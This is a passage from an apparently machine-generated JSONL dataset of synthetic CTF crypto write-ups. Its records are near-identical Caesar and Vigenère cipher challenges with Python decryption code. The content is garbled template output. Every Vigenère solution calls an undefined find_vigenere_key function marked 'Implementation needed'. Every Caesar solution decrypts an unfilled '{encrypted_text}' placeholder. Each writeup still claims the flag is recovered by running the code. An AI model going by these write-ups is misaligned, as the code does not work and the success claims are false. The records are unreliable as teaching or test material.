chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/4", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831646", "synthetic": true}
{"id": "synthetic_classical_005", "team": "synthetic_team_8", "event": "CTF_2024_Event_20", "challenge_name": "Vigenère Cipher #6", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/5", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831668", "synthetic": true}
{"id": "synthetic_classical_006", "team": "synthetic_team_6", "event": "CTF_2024_Event_5", "challenge_name": "Caesar Cipher #7", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/6", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831680", "synthetic": true}
{"id": "synthetic_classical_007", "team": "synthetic_team_8", "event": "CTF_2024_Event_6", "challenge_name": "Caesar Cipher #8", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/7", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831690", "synthetic": true}
{"id": "synthetic_classical_008", "team": "synthetic_team_10", "event": "CTF_2024_Event_5", "challenge_name": "Caesar Cipher #9", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/8", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831703", "synthetic": true}
{"id": "synthetic_classical_009", "team": "synthetic_team_8", "event": "CTF_2024_Event_6", "challenge_name": "Vigenère Cipher #10", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/9", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831721", "synthetic": true}
{"id": "synthetic_classical_010", "team": "synthetic_team_6", "event": "CTF_2024_Event_5", "challenge_name": "Caesar Cipher #11", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/10", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831735", "synthetic": true}
{"id": "synthetic_classical_011", "team": "synthetic_team_7", "event": "CTF_2024_Event_20", "challenge_name": "Caesar Cipher #12", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/11", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831748", "synthetic": true}
{"id": "synthetic_classical_012", "team": "synthetic_team_5", "event": "CTF_2024_Event_10", "challenge_name": "Caesar Cipher #13", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/12", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831758", "synthetic": true}
{"id": "synthetic_classical_013", "team": "synthetic_team_10", "event": "CTF_2024_Event_18", "challenge_name": "Vigenère Cipher #14", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/13", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831776", "synthetic": true}
{"id": "synthetic_classical_014", "team": "synthetic_team_4", "event": "CTF_2024_Event_7", "challenge_name": "Caesar Cipher #15", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/14", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831786", "synthetic": true}
{"id": "synthetic_classical_015", "team": "synthetic_team_2", "event": "CTF_2024_Event_1", "challenge_name": "Vigenère Cipher #16", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/15", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831802", "synthetic": true}
{"id": "synthetic_classical_016", "team": "synthetic_team_2", "event": "CTF_2024_Event_10", "challenge_name": "Caesar Cipher #17", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/16", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831813", "synthetic": true}
{"id": "synthetic_classical_017", "team": "synthetic_team_3", "event": "CTF_2024_Event_9", "challenge_name": "Caesar Cipher #18", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/17", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831824", "synthetic": true}
{"id": "synthetic_classical_018", "team": "synthetic_team_3", "event": "CTF_2024_Event_9", "challenge_name": "Vigenère Cipher #19", "challenge_description": "Polyalphabetic substitution cipher with repeating key", "attack_type": "Classical", "tools_used": ["python-builtin", "frequency-analysis"], "difficulty": "medium", "writeup": "# Vigenère Cipher\n\n## Challenge Description\nPolyalphabetic substitution cipher with repeating key\n\n## Analysis\nThis challenge involves vigenère cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n\n```\n\n## Tools Used\n- python-builtin, frequency-analysis\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef vigenere_decrypt(text, key):\n    result = \"\"\n    key_index = 0\n    \n    for char in text:\n        if char.isalpha():\n            shift = ord(key[key_index % len(key)].upper()) - ord('A')\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n            key_index += 1\n        else:\n            result += char\n    \n    return result\n\n# Key recovery using frequency analysis\nencrypted = \"synt{guvf_vf_n_grfg_synt}\"\nkey = find_vigenere_key(encrypted)  # Implementation needed\nflag = vigenere_decrypt(encrypted, key)\nprint(flag)\n", "url": "https://synthetic-ctf.example.com/classical/18", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831847", "synthetic": true}
{"id": "synthetic_classical_019", "team": "synthetic_team_5", "event": "CTF_2024_Event_10", "challenge_name": "Caesar Cipher #20", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/19", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831858", "synthetic": true}
{"id": "synthetic_classical_020", "team": "synthetic_team_5", "event": "CTF_2024_Event_12", "challenge_name": "Caesar Cipher #21", "challenge_description": "Simple shift cipher, brute force all shifts", "attack_type": "Classical", "tools_used": ["python-builtin"], "difficulty": "easy", "writeup": "# Caesar Cipher\n\n## Challenge Description\nSimple shift cipher, brute force all shifts\n\n## Analysis\nThis challenge involves caesar cipher techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n\n```\n\n## Tools Used\n- python-builtin\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\ndef caesar_decrypt(text, shift):\n    result = \"\"\n    for char in text:\n        if char.isalpha():\n            ascii_offset = 65 if char.isupper() else 97\n            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)\n        else:\n            result += char\n    return result\n\nencrypted = \"{encrypted_text}\"\n\nfor shift in range(26):\n    decrypted = caesar_decrypt(encrypted, shift)\n    if 'flag{' in decrypted.lower():\n        print(f\"Shift: {shift}\")\n        print(f\"Flag: {decrypted}\")\n        break\n", "url": "https://synthetic-ctf.example.com/classical/20", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.831868", "synthetic": true}
